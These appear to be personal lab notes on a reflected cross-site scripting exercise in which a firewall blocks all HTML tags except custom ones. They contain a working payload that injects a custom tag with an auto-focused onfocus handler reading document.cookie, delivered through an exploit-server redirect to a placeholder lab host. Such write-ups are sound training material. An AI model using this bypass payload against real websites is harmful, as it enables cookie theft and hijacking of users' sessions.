# Reflected XSS into HTML context with all tags blocked except custom ones

WAF may block all HTML tags except custom ones, so this may enable an XSS attack

![Снимок экрана 2025-11-14 в 15.46.34.png](Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20bloc/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_15.46.34.png)

![Снимок экрана 2025-11-14 в 15.46.56.png](Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20bloc/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_15.46.56.png)

So craft a payload for the exploit server

```jsx
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called.

![Снимок экрана 2025-11-14 в 15.58.49.png](Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20bloc/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_15.58.49.png)

![Снимок экрана 2025-11-14 в 15.59.11.png](Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20bloc/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_15.59.11.png)